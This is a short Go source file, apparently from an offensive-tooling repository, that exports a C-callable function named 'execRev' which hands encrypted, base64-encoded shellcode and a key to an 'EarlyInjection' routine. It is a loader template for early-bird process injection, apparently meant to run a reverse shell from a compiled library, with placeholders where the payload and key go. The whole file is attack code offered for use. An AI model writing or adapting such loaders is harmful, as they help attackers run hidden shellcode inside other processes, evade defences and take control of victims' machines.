package main

import "C"
import (
	early_injection "github.com/MrTuxx/OffensiveGolang/pkg/payloads/injections/EarlyInjection"
)

//export execRev
func execRev() error {

	enc_string := "<SHELLCODE ENCRYPTED AND BASE64-ENCODED>"
	key := "<KEY BASE64-ENCODED>"

	early_injection.EarlyInjection(enc_string, key)
	return nil
}

func main() {
	//Blank
}
